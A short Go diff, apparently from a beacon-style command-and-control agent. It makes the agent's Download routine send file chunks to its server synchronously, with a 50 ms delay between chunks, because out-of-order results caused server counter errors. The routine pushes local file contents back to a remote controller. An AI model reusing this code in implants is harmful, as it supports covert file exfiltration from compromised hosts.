@@ -9,6 +9,7 @@ import (
 	"os"
 	"path/filepath"
 	"strings"
+	"time"
 )
 
 func Upload(b []byte) error {
@@ -157,25 +158,29 @@ func Download(b []byte) error {
 	if err != nil {
 		return err
 	}
-	go func() {
-		var fileContent []byte
-		// 1M
-		fileBuf := make([]byte, 1024*1024)
-		for {
-			n, err := fileHandle.Read(fileBuf)
-			if err != nil && err != io.EOF {
-				break
-			}
-			if n == 0 {
-				break
-			}
-			fileContent = fileBuf[:n]
-			result = util.BytesCombine(requestIDBytes, fileContent)
-			packet.PushResult(packet.CALLBACK_FILE_WRITE, result)
+	// revert to sync
+	// it seems download need continuous counter, so if I use go func to send result back,
+	// and if there is other cmd send their result, download would fail, and server will output counter error
+	//go func() {
+	var fileContent []byte
+	// 1M
+	fileBuf := make([]byte, 1024*1024)
+	for {
+		n, err := fileHandle.Read(fileBuf)
+		if err != nil && err != io.EOF {
+			break
 		}
+		if n == 0 {
+			break
+		}
+		fileContent = fileBuf[:n]
+		result = util.BytesCombine(requestIDBytes, fileContent)
+		packet.PushResult(packet.CALLBACK_FILE_WRITE, result)
+		time.Sleep(time.Millisecond * 50)
+	}
 
-		packet.PushResult(packet.CALLBACK_FILE_CLOSE, requestIDBytes)
-	}()
+	packet.PushResult(packet.CALLBACK_FILE_CLOSE, requestIDBytes)
+	//}()
 	return nil
 }
 
